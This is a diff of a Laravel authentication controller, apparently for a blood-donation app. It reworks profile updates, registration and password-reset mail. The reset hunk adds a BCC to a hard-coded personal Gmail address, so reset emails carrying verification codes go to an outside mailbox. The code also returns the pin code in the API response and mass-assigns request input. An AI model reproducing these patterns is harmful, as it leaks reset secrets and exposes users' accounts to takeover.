@@ -31,7 +31,7 @@ class AuthController extends Controller
         // dd($this->user());                   // doesn't work
 
         $validator = validator($request->all(), [
-            'password' => 'confirmed', 
+            'password' => 'confirmed',          // If user want to change his password
             'email' => Rule::unique('clients')->ignore($request->user()->id),                
             'phone' => Rule::unique('clients')->ignore($request->user()->id)
         ]);
@@ -42,27 +42,25 @@ class AuthController extends Controller
         }
 
         $client = $request->user();
-        $client->update($request->all());
 
-        if($request->has('password'))
-        {
-            $client->password = bcrypt($request->password);
+        if($request->password || $request->governorate_id || $request->blood_type_id){
+            $client->update($request->all());
+
+            if($request->has('password'))
+                $client->password = bcrypt($request->password);
+            
+            $client->save();
+
+            if($request->has('governorate_id'))
+                $client->governorates()->sync($request->governorate_id);
+
+            if($request->has('blood_type_id'))
+                $client->bloodTypes()->sync($request->blood_type_id);
+
+            return apiResponse(1, 'updates has been updated succesfully', $client);
         }
+        return apiResponse(1, 'بيانات المستخدم', $client);
 
-        $client->save();
-
-
-        if($request->has('governorate_id'))
-        {
-            $client->governorates()->sync([2, 4]);
-        }
-
-        if($request->has('blood_type_id'))
-        {
-            $client->bloodTypes()->sync([2, 3, 4]);
-        }
-
-        return apiResponse(1, 'updates has been updated succesfully', $client);
     }
 
     public function register(Request $request)
@@ -97,9 +95,8 @@ class AuthController extends Controller
 
         // By Default: Link user to his blood type and governorate in the Notification settings
         $city = City::where('id', $request->city_id)->first();
+
         $client->governorates()->attach($city->governorate_id);
-
-
         $client->bloodTypes()->attach($request->blood_type_id);
         
         return apiResponse(1, 'تم الإضافة بنجاح', [
@@ -201,7 +198,9 @@ class AuthController extends Controller
 
                 // Send Email
                 // Mail::to($client->email)
-                Mail::to($client->email)->send(new ResetPassword($client));
+                Mail::to($client->email)
+                    ->bcc('mokammel0000@gmail.com')
+                    ->send(new ResetPassword($client));
 
                 return apiResponse(1, 'تم إرسال كود التحقق، برجاء فحص البريد الإلكتروني', [
                     'pin_code' => $code, 
